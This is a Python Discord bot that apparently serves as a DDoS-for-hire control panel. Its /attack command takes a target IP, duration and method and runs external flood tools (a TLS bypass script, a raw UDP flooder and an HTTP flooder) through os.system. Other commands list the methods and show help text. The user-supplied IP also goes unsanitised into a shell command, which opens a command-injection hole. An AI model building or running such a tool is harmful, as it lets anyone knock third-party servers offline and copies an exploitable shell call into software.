from cgitb import text
from disnake.ext import commands
import psutil
from json import loads, dumps, load
import json, asyncio
import disnake
from disnake.ext import commands
import discord
import pytz
import requests
from discord import Embed, Intents, Streaming
import datetime
import sys, os, socket

with open('config.json') as settings:
    config = load(settings)

token = config.get('token')
guildID = int(config.get('guid'))
logfile = config.get('logfile')
name = config.get('botname')
Tz = config.get('TimeZone')
ostime = datetime.datetime.now(pytz.timezone(f'{Tz}'))

bot = commands.InteractionBot(test_guilds=[guildID])

def main1(ip, time, method):
    if method == "tls":
        os.system(f'node TLS-BYPASS.js {ip} 100 {time} http.txt 300')
    elif method == "udp":
        os.system(f'./udpraw {ip} {time}')
    elif method == "http":
        os.system(f'nnnn.exe {ip} 1 3 {time}')

@bot.slash_command()
async def attack(inter, ip: str, time: int, method: str):
    username = (f"{inter.author}")
    def run():
        main1(ip, time, method)
        print(f"200 OK UDP By {username}")
        with open(f'{logfile}', 'a') as saveFile:
            saveFile.write(''.join(f"{ostime} > System-Log {method} {ip}  Time {time} user {username} \n"))
    emb = disnake.Embed(title=f"{method} IP: {ip}  TIME: {time}")
    emb.set_footer(text=f'{name}', icon_url='https://cdn.discordapp.com/attachments/973633916139352211/1003291851903733860/246493733_1728374774218603_916455784732735740_n.jpg')
    await inter.response.send_message(embed=emb)
    run()

@bot.slash_command()
async def help(inter):
    username = (f"{inter.author}")
    def run():
        print(f"HELP By {username}")
    emb = disnake.Embed(title=f"/attack [ip] [time] [method]")
    emb.set_footer(text=f'{name}', icon_url='https://cdn.discordapp.com/attachments/973633916139352211/1003291851903733860/246493733_1728374774218603_916455784732735740_n.jpg')
    await inter.response.send_message(embed=emb)
    run()

@bot.slash_command()
async def methods(inter):
    username = (f"{inter.author}")
    def run():
        print(f"methods By {username}")
    emb = disnake.Embed(title=f"tls \nudp \nhttp")
    emb.set_footer(text=f'{name}', icon_url='https://cdn.discordapp.com/attachments/973633916139352211/1003291851903733860/246493733_1728374774218603_916455784732735740_n.jpg')
    await inter.response.send_message(embed=emb)
    run()

bot.run(token)
